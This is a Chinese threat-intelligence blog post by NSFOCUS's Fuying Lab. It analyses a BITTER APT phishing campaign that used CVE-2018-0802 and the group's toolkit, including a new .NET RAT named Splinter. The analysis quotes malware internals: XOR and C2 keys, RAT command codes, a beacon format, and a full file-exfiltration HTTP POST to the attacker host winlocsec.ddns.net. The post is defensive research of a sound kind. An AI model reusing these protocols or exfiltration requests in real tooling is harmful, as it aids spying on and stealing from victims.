2019/11/11 Splinter新APT攻击⼯具透析 | 绿盟科技博客

(http://blog.nsfocus.net/)

Splinter新APT攻击⼯具透析
 14 days ago (http://blog.nsfocus.net/splinters-new-apt-attack-tool-dialysis/)  伏影实验室 (http://blog.nsfocus.net/author/fuying-lab/) ( )

  阅读： 374
       近期，绿盟科技伏影实验室威胁追踪系统监测到⼀个新APT攻击事件。此次事件起源于我们截获的⼀封邮件所含附件，该邮件命名为“指示细节”，内附⽂档《指示细节.doc》，该⽂档使⽤
CVE-2018-0802漏洞进⾏攻击。

⽂章⽬录 

⼀、概述

⼆、活动分析

    1、攻击⽅式
    2、Splinter功能分析
    3、其他攻击⼯具分析

三、对⽐分析
1、⼆进制⽂件对⽐
2、⽹络信息对⽐
3、关联分析

blog.nsfocus.net/splinters-new-apt-attack-tool-dialysis/ 1/15



2019/11/11 Splinter新APT攻击⼯具透析 | 绿盟科技博客

四、总结

五、参考链接

关于伏影实验室

关于绿盟威胁情报中⼼

⼀、概述
       近期，绿盟科技伏影实验室威胁追踪系统监测到⼀个新APT攻击事件。此次事件起源于我们截获的⼀封邮件所含附件，该邮件命名为“指示细节”，内附⽂档《指示细节.doc》，该⽂档使⽤
CVE-2018-0802漏洞进⾏攻击。经过持续的跟踪与监控，我们最终捕获到该事件背后组织存放恶意⽂件的托管服务器地址，并获取到了攻击武器库中所有的⽂件。在与历史数据进⾏对⽐后，
我们发现该组织近期更新了多个攻击⼯具，且对部分⼯具进⾏了功能细分。此次获取的⼯具包括：下载器，键盘记录器，上传agent⼯具，独⽴的命令模块以及远控⼯具。在其中我们发现了⼀
个从未在该组织基础设施中发现过的RAT⼯具。该⼯具尚处于开发状态，其功能⽇趋复杂，我们对其进⾏持续的发掘和追踪，并将其命名为Splinter。

⼆、活动分析

     1、攻击⽅式
       此次攻击仍然使⽤钓⻥Doc⽂档作为攻击投递⼿段，利⽤了CVE-2018-0802的漏洞进⾏攻击，运⾏后下载可执⾏⽂件，并执⾏。

     2、Splinter功能分析
       我们在攻击者服务器上找到了⼀个全新的攻击⼯具，我们将其命名为Splinter。Splinter使⽤.NET语⾔开发。接下来我们对其进⾏详细分析。

图 PE信息截图

⾸先通过⼯具可以看到该样本在2019-08-28编译，并且存在pdb路径，可⻅此攻击⼯具是该组织当前最新制作⼯具，极可能在未来投放使⽤。

图 RAT信息

Splinter在⽹络通信过程中使⽤加密算法进⾏特征隐藏，规避检测。其在与C2的交互上内置了两种不同的加密⽅式，第⼀种为BITTER常使⽤的xor算法，密钥1为：0xB65F6，密钥2为：123，
密钥3为：0x2，密钥4为：‘LZQR’；第⼆种为AES-256，但在实际分析过程中，该加密算法并未启⽤，我们推测，这个加密⽅式应该处于测试阶段，且当前RAT⼯具仍处于开发阶段。

Splinter内置了多种远控功能，在初始化函数中，所有功能函数及其说明如下：

blog.nsfocus.net/splinters-new-apt-attack-tool-dialysis/ 2/15



2019/11/11 Splinter新APT攻击⼯具透析 | 绿盟科技博客

图 功能模块信息

对其控制协议进⾏详细解析，指令及对应功能、特征列举如下：

blog.nsfocus.net/splinters-new-apt-attack-tool-dialysis/ 3/15



2019/11/11 Splinter新APT攻击⼯具透析 | 绿盟科技博客

表：协议结构

⽽在2019年9⽉5⽇ 9:23攻击者上传了该新RAT⼯具的第⼆个版本，此版本更新了⽹络连接部分，去除了原本的加密⽅法，我们推测该组织的开发⼈员可能在加密解密部分以及通信隐蔽性上遇
到了麻烦。

     3、其他攻击⼯具分析
       此次事件，我们获取到了所有托管在该C2服务器上的恶意⽂件及活动记录。2019年9⽉5⽇，我们监控到该服务器上的⽂件更新，且在9⽉5⽇晚些时候再次更新了服务器上的RAT⼯具，
2019年9⽉8⽇该服务器已经关闭，但随后⼜重新开启。

对此次事件涉及Doc⽂档，及服务器上所获取攻击⼯具如下。

 钓⻥Doc⽂档-投递⼯具载体

blog.nsfocus.net/splinters-new-apt-attack-tool-dialysis/ 4/15



2019/11/11 Splinter新APT攻击⼯具透析 | 绿盟科技博客

       此次事件投递载体钓⻥Doc⽂档，其下载的恶意可执⾏⽂件使⽤ROT13变形算法对恶意⽂件中存在的静态字符串进⾏加密，将字符串解密后发现了其使⽤的C2域名，该C2是⼀个⽂件服务
器，存储了此次攻击所使⽤的所有攻击⼯具。同时，受感染机器也会向该地址发送从受感染机器上提取的机器信息。

图 算法截图

该恶意⽂件会获取主机名、计算机名、操作系统信息、当前机器的⽤户名及GUID，并将这些信息拼接成固定格式的字符串，利⽤HTTP的GET⽅法上传⾄服务器，格式如下：

       ?a=[主机名]&b=[计算机名]&c=[操作系统信息]&d=[当前机器的⽤户名及GUID]&e=

       在接收到C2返回的数据中搜索Yes file字段，如果存在该字符串，则搜索[]字符，获取[]中的数据，和url进⾏拼接，下载后重命名为.exe结尾的⽂件，并执⾏。

       audiodq-下载器：

       该⽂件即为doc下载的恶意⽂件，该⽂件负责根据C2下发的任务，下载不同的模块到受感染机器中。

       igfxsrvk-键盘记录器：

       通过设置键盘钩⼦，获取键盘按键信息，搜集输⼊的内容，保存在%APPDATA%\syslog0812AXbcW1.tean⽂件中，该⽂件名以syslog开头，降低了在⼈⼯排查时被快速发现的概率。

blog.nsfocus.net/splinters-new-apt-attack-tool-dialysis/ 5/15



2019/11/11 Splinter新APT攻击⼯具透析 | 绿盟科技博客

图 关键代码截图

       lsap、lsapc、lsapcr – 上传者⼯具：

       创建log⽂件：C:\Windows\debug\WIA\winlog0a.txt，记录近期改动的⽂件名称，获取计算机名称，获取GUID，将以上信息拼接，使⽤HTTP协议将数据发送出去。

图 lsap核⼼功能截图

       上传信息格式如下：

POST /autolan.php?l=WIN-HV9TU5VPRAN@8c6a7398-ff99-410c-a6c3-d6acbffd41ce@2019.09.06.133248@C HTTP/1.1

Host: winlocsec.ddns.net

Content-Type: multipart/form-data; boundary=—-aNtPOGQuYdaKesBchd3651PDK986436LSTHSYB23akdKsOPxrsQzvf

Content-Length: 823

Connection: Keep-Alive

——aNtPOGQuYdaKesBchd3651PDK986436LSTHSYB23akdKsOPxrsQzvf

Content-Disposition: form-data; name=”file”; filename=”C:\Windows\debug\WIA\winlog0a.txt”

Content-Type: text/plain

20190906104956_C:\Users\hello\AppData\Roaming\syslog0812AXbcW.neat||20190905155411_C:\Users\hello\Desktop\z

       其中——aNtPOGQuYdaKesBchd3651PDK986436LSTHSYB23akdKsOPxrsQzvf和—-aNtPOGQuYdaKesBchd3651PDK986436LSTHSYB23akdKsOPxrsQzvf是样本中⾃带信息，未发现
解析过程。

       sht、sleep-功能模块

       负责执⾏命令：c:\\windows\\system32\\shutdown /s /t 0

blog.nsfocus.net/splinters-new-apt-attack-tool-dialysis/ 6/15



2019/11/11 Splinter新APT攻击⼯具透析 | 绿盟科技博客

图 sht模块核⼼代码截图

图 sleep模块核⼼代码截图

       根据上传时间，可以认为sleep⽂件⽤来替换sht⽂件，经对⽐得知两⽂件⽆任何差别。

       Kill、regdl-功能模块

       设置⾃启动项：

图 kill模块中⾃启动项内容

blog.nsfocus.net/splinters-new-apt-attack-tool-dialysis/ 7/15



2019/11/11 Splinter新APT攻击⼯具透析 | 绿盟科技博客

图 regdl模块中⾃启动项内容

       winsvc-远控模块

       我们认为此次使⽤的⼯具与其V3版本[lw3] [z4] 的远控⼯具[1]功能完全⼀致，加密算法也⼀致，C2交互命令使⽤密钥为：mar4tysvql4dc，除此之外并⽆不同，其命令指令功能列举如下：

表：命令控制字含义

ID 释义

3000 当前状态信息

3001 获取磁盘列表

3002 枚举指定⽬录下⽂件

3004 重新读取枚举⽬录的⽂件列表

3005 创建⽂件

3006 写⼊⽂件

3007 打开⽂件

3009 读取并上传

3012 创建cmd进程，利⽤管道进⾏通信

3013 执⾏cmd命令

3015 重新读取执⾏结果

3016 终⽌cmd进程

三、对⽐分析
       我们从⼆进制⽂件，⽹络信息以及关联分析的⻆度，对此次攻击事件中捕获的恶意⽂件进⾏分析，发现除Splinter远控⼯具之外，其他⼯具均属于BITTER这⼀APT组织。

1、⼆进制⽂件对⽐
       我们通过hash搜索到了2018年BITTER报告中的Downloader⼆进制⽂件，从代码结构上看，两者⼏乎完全⼀致。

blog.nsfocus.net/splinters-new-apt-attack-tool-dialysis/ 8/15



2019/11/11 Splinter新APT攻击⼯具透析 | 绿盟科技博客

图 代码对⽐

Keylogger模块对⽐：

图 对⽐图

远控模块对⽐结果：

图 对⽐图

blog.nsfocus.net/splinters-new-apt-attack-tool-dialysis/ 9/15



2019/11/11 Splinter新APT攻击⼯具透析 | 绿盟科技博客

我们在分析regdl⽂件时，发现了相同的pdb路径，且两者除时间不⼀致外，其他信息完全⼀致：

图 对⽐图

以上分析结果与友商在2018年披露的BITTER组织使⽤的攻击⼯具、其他⼚商在2017年发布的⽂章中提及到的攻击模块的流程完全⼀致，因此我们认为该C2服务器及提及到的恶意软件归属于
BITTER组织。

2、⽹络信息对⽐

图 流量信息截图

上图为downloader产⽣的流量，可以看到发送的信息格式是完全⼀致的，且属于V3版本。

我们在最新的RAT⼯具中解析得到了域名和早已披露的RAT⼯具中获取的域名mscnsservice.ddns.net的命名上有相通之处，且与上传者恶意⽂件中附带的信息上传域名类似。

3、关联分析
       利⽤分析样本获取到的关键特征，我们查找到了名为lsap.exe的⽂件,对⽐⼆进制⽂件：

图 对⽐图

核⼼代码部分基本上完全⼀致。2019.05版本的C2地址和本次捕获的恶意⽂件连接的C2地址相同。

在我们捕获该组恶意⽂件时，所有涉及到的基础设施⽬前均未被标记为BITTER，我们认为这些设施仍处于未被发现的状态。

blog.nsfocus.net/splinters-new-apt-attack-tool-dialysis/ 10/15



2019/11/11 Splinter新APT攻击⼯具透析 | 绿盟科技博客

四、总结
       尽管众多的安全⼚商持续不断的披露APT组织，对APT组织进⾏深度的挖掘和分析，但仍然⽆法阻⽌这些APT组织开发新的攻击模块以及建设新的恶意基础设施。此次捕获到的恶意样本与
2019年5⽉2⽇上传的恶意样本对⽐可以看出，⾄少在这3个⽉期间内，该团伙⼀直在集中精⼒开发新的RAT⼯具。可以预⻅的是，Splinter会在不久的将来替换原有的RAT⼯具，且其采⽤的加
密⽅法将对检测带来相当⼤的困扰。

五、参考链接
https://s.tencent.com/research/report/615.html (https://s.tencent.com/research/report/615.html)

关于伏影实验室

伏影实验室专注于安全威胁研究与监测技术，包括但不限于威胁识别技术，威胁跟踪技术，威胁捕获技术，威胁主体识别技术。研究⽬标包括：僵⼫⽹络威胁，DDOS对抗，WEB对抗，流⾏
服务系统脆弱利⽤威胁、身份认证威胁，数字资产威胁，⿊⾊产业威胁 及 新兴威胁。通过掌控现⽹威胁来识别⻛险，缓解威胁伤害，为威胁对抗提供决策⽀撑。

关于绿盟威胁情报中⼼
绿盟威胁情报中⼼（NSFOCUS Threat Intelligence center, NTI）是绿盟科技为落实智慧安全2.0战略，促进⽹络空间安全⽣态建设和威胁情报应⽤，增强客户攻防对抗能⼒⽽组建的专业性安全
研究组织。其依托公司专业的安全团队和强⼤的安全研究能⼒，对全球⽹络安全威胁和态势进⾏持续观察和分析，以威胁情报的⽣产、运营、应⽤等能⼒及关键技术作为核⼼研究内容，推出了

绿盟威胁情报平台以及⼀系列集成威胁情报的新⼀代安全产品，为⽤户提供可操作的情报数据、专业的情报服务和⾼效的威胁防护能⼒，帮助⽤户更好地了解和应对各类⽹络威胁。

⽂章分类： 技术前沿 (http://blog.nsfocus.net/category/techfront/) 
⽂章关键词： APT (http://blog.nsfocus.net/tag/apt/), NSFOCUS (http://blog.nsfocus.net/tag/nsfocus/), Splinter (http://blog.nsfocus.net/tag/splinter/), ⼯具
(http://blog.nsfocus.net/tag/%e5%b7%a5%e5%85%b7/), 技术博客 (http://blog.nsfocus.net/tag/%e6%8a%80%e6%9c%af%e5%8d%9a%e5%ae%a2/), 攻击

blog.nsfocus.net/splinters-new-apt-attack-tool-dialysis/ 11/15



2019/11/11 Splinter新APT攻击⼯具透析 | 绿盟科技博客

(http://blog.nsfocus.net/tag/%e6%94%bb%e5%87%bb/), 绿盟 (http://blog.nsfocus.net/tag/%e7%bb%bf%e7%9b%9f/) 
转载请注明：“转⾃绿盟科技博客”： 原⽂链接 (http://blog.nsfocus.net/splinters-new-apt-attack-tool-dialysis/).
⽂章收录：

← Web安全之防⽌浏览器⾃动代填和回显已保存账号 绿盟科技互联⽹安全威胁周报NSFOCUS-2019-43 →
(http://blog.nsfocus.net/web-security-prevents-browsers-from-automatically-filling- (http://blog.nsfocus.net/nsfocus-2019-43/)
in-and-echoing-saved-accounts/)

发表评论
要发表评论，您必须先登录 (http://blog.nsfocus.net/wp-login.php?redirect_to=http%3A%2F%2Fblog.nsfocus.net%2Fsplinters-new-apt-attack-tool-dialysis%2F)。

绿盟科技博客精华⽂章

学习⼿册：浅析DDoS的攻击及防御 (http://blog.nsfocus.net/analysis-ddos-attack-defense/)
学习⼿册：盘点DDoS带来的误会 (http://blog.nsfocus.net/inventory-ddos-errors/)
移动APP安全测试要点 (http://blog.nsfocus.net/mobile-app-security-security-test/)
Dedecms远程写⽂件漏洞分析 (http://blog.nsfocus.net/dedecms-write-file-vuln/)
【⼲货分享】XSS攻击进阶篇——那些年我们看不懂的XSS (http://blog.nsfocus.net/xss-advance/)

两步邮件订阅，⽅便获取⽂章
欢迎订阅！现在已有6 705个朋友订阅了。
在后续邮件的尾部，您可以退订及修改订阅内容。
选择订阅组：

 最新⽂章
 技术分享
 漏洞分析
 运维安全
 Web安全
 安全报告

邮件 *
⻢上订阅！

绿盟科技博客功能

注册 (http://blog.nsfocus.net/wp-login.php?action=register)
登录 (http://blog.nsfocus.net/wp-login.php)
⽂章RSS (Really Simple Syndication) (http://blog.nsfocus.net/feed/)
评论RSS (Really Simple Syndication) (http://blog.nsfocus.net/comments/feed/)
WordPress.org (https://cn.wordpress.org/)

绿盟科技博客⽂章标签

绿盟科技 (http://blog.nsfocus.net/tag/%e7%bb%bf%e7%9b%9f%e7%a7%91%e6%8a%80/)   漏洞
(http://blog.nsfocus.net/tag/%e6%bc%8f%e6%b4%9e/)   远程代码执⾏漏洞
(http://blog.nsfocus.net/tag/%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e/)   绿盟科技漏洞
库 (http://blog.nsfocus.net/tag/%e7%bb%bf%e7%9b%9f%e7%a7%91%e6%8a%80%e6%bc%8f%e6%b4%9e%e5%ba%93/)   NSFOCUS
(http://blog.nsfocus.net/tag/nsfocus/)   EnglishVersion (http://blog.nsfocus.net/tag/englishversion/)   DDoS (http://blog.nsfocus.net/tag/ddos/)   技术博客
(http://blog.nsfocus.net/tag/%e6%8a%80%e6%9c%af%e5%8d%9a%e5%ae%a2/)   远程代码执⾏
(http://blog.nsfocus.net/tag/%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c/)   云安全
(http://blog.nsfocus.net/tag/%e4%ba%91%e5%ae%89%e5%85%a8/)   威胁情报
(http://blog.nsfocus.net/tag/%e5%a8%81%e8%83%81%e6%83%85%e6%8a%a5/)   ⽹络安全
(http://blog.nsfocus.net/tag/%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8/)   威胁 (http://blog.nsfocus.net/tag/%e5%a8%81%e8%83%81/)   物联⽹安全
(http://blog.nsfocus.net/tag/%e7%89%a9%e8%81%94%e7%bd%91%e5%ae%89%e5%85%a8/)   ⾼危漏洞
(http://blog.nsfocus.net/tag/%e9%ab%98%e5%8d%b1%e6%bc%8f%e6%b4%9e/)   绿盟科技博客

blog.nsfocus.net/splinters-new-apt-attack-tool-dialysis/ 12/15



2019/11/11 Splinter新APT攻击⼯具透析 | 绿盟科技博客

(http://blog.nsfocus.net/tag/%e7%bb%bf%e7%9b%9f%e7%a7%91%e6%8a%80%e5%8d%9a%e5%ae%a2/)   威胁通告
(http://blog.nsfocus.net/tag/%e5%a8%81%e8%83%81%e9%80%9a%e5%91%8a/)   rsa2018 (http://blog.nsfocus.net/tag/rsa2018/)   安全会议
(http://blog.nsfocus.net/tag/%e5%ae%89%e5%85%a8%e4%bc%9a%e8%ae%ae/)   安全周报
(http://blog.nsfocus.net/tag/%e5%ae%89%e5%85%a8%e5%91%a8%e6%8a%a5/)   ddos攻击事件
(http://blog.nsfocus.net/tag/ddos%e6%94%bb%e5%87%bb%e4%ba%8b%e4%bb%b6/)   DDoS攻击
(http://blog.nsfocus.net/tag/ddos%e6%94%bb%e5%87%bb/)   云计算 (http://blog.nsfocus.net/tag/%e4%ba%91%e8%ae%a1%e7%ae%97/)   ⼤数据
(http://blog.nsfocus.net/tag/%e5%a4%a7%e6%95%b0%e6%8d%ae/)   勒索软件
(http://blog.nsfocus.net/tag/%e5%8b%92%e7%b4%a2%e8%bd%af%e4%bb%b6/)   安全意识
(http://blog.nsfocus.net/tag/%e5%ae%89%e5%85%a8%e6%84%8f%e8%af%86/)   恶意软件
(http://blog.nsfocus.net/tag/%e6%81%b6%e6%84%8f%e8%bd%af%e4%bb%b6/)   物联⽹
(http://blog.nsfocus.net/tag/%e7%89%a9%e8%81%94%e7%bd%91/)   漏洞分析
(http://blog.nsfocus.net/tag/%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/)   态势感知
(http://blog.nsfocus.net/tag/%e6%80%81%e5%8a%bf%e6%84%9f%e7%9f%a5/)  

最新⽂章

【威胁通告】Squid多个⾼危漏洞预警通告 (http://blog.nsfocus.net/cve-2019-12526-cve-2019-18679-cve-2019-18678/)
【威胁通告】开源压缩库Libarchive代码执⾏漏洞（CVE-2019-18408） (http://blog.nsfocus.net/cve-2019-18408/)
绿盟科技互联⽹安全威胁周报NSFOCUS-2019-44 (http://blog.nsfocus.net/nsfocus-2019-44/)
⽹络安全威胁⽉报NSFOCUS-2019-10 (http://blog.nsfocus.net/nsfocus-2019-10/)
Jenkins 路由解析及沙箱绕过漏洞分析报告(上) (http://blog.nsfocus.net/jenkins-routing-resolution-and-sandbox-bypass-vulnerability-analysis-report/)
【威胁通告】Apache Solr Velocity远程代码执⾏漏洞处置⼿册 (http://blog.nsfocus.net/ns-2019-0046/)
【威胁通告】 Apache Solr远程命令执⾏漏洞 (http://blog.nsfocus.net/apache-solr2019-10-31/)
APT技术观察——APT与隐写术 (http://blog.nsfocus.net/apt-technology-observation-apt-and-steganography/)
绿盟科技互联⽹安全威胁周报NSFOCUS-2019-43 (http://blog.nsfocus.net/nsfocus-2019-43/)
Splinter新APT攻击⼯具透析 (http://blog.nsfocus.net/splinters-new-apt-attack-tool-dialysis/)

友情链接

绿盟科技官⽹ (http://www.nsfocus.com.cn)
绿盟威胁情报中⼼NTI (https://nti.nsfocus.com/)

绿盟科技博客读者群

© 2017 NSFOCUS Corporation (http://www.nsfocus.com), all rights reserved.

blog.nsfocus.net/splinters-new-apt-attack-tool-dialysis/ 13/15



2019/11/11 Splinter新APT攻击⼯具透析 | 绿盟科技博客

blog.nsfocus.net/splinters-new-apt-attack-tool-dialysis/ 14/15



2019/11/11 Splinter新APT攻击⼯具透析 | 绿盟科技博客

blog.nsfocus.net/splinters-new-apt-attack-tool-dialysis/ 15/15